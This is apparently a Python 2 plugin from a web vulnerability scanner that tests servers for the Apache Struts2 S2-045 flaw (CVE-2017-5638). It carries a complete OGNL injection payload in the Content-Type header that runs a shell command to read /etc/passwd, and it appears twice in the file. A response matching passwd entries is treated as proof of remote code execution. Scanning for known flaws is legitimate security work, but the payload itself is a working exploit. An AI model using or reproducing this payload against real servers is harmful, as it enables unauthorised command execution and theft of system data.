#!/usr/bin/python
# -*- coding: utf-8 -*-
import httplib
httplib.HTTPConnection._http_vsn= 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'

from engine.engine_utils.common import *
from urlparse import urlparse
from engine.logger import scanLogger as logger

'''
CVE-2017-5638

CVSS分值:	10	[严重(HIGH)]

CWE-20	[输入验证不恰当]
'''
def run_url(http, ob, item):
    # cmd1 = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
    #        "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" \
    #        ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil." \
    #        "getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))." \
    #        "(#cmd='cat /etc/passwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." \
    #        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds))." \
    #        "(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2." \
    #        "ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy" \
    #        "(#process.getInputStream(),#ros)).(#ros.flush())}"
    cmd1 = '''%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='''+'\''+'cat /etc/passwd'+'\''+''').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'''

    header = {
        "Host": ob['domain'],
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Referer": item['refer'],
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "content-type":cmd1
        # "Cookie": ob.get('cookie')
    }
    result = []
    try:
        path = item['url']
        params = item['params']
        method = item['method']
        timeout = ob.get('webTimeout')

        url_parse = urlparse(path)
        netloc = url_parse.netloc
        source_ip = ob.get('source_ip')
        if source_ip:
            netloc = source_ip
        # new_url = '%s://%s/%s' % (url_parse.scheme, url_parse.netloc, url_parse.path)
        conn = httplib.HTTPConnection(netloc)
        conn.request(method.upper(),url_parse.path, headers=header)
        httpres = conn.getresponse()
        content = httpres.read()
        # res, content = httplib.HTTP().request(path, method.upper(), headers=header)
        if httpres.status == 200:

            if re.search(r'(\bWindows\b.{20}\bIP\b)', content, re.I) or re.search(r'(\broot:\b|\bbin:\b|\bnobody:\b)', content):
                response = getResponse(content)
                request = getRequest(path, domain=ob['domain'])
                detail = " Apache Struts2 s045 Skill名远程代码执行漏洞"
                result.append(getRecord(ob, path, ob['level'], detail, request, response))

        return result

    except Exception, e:
        logger.error("Struts2_S045_script.py, run_url function :%s" % (str(e)))
        return result
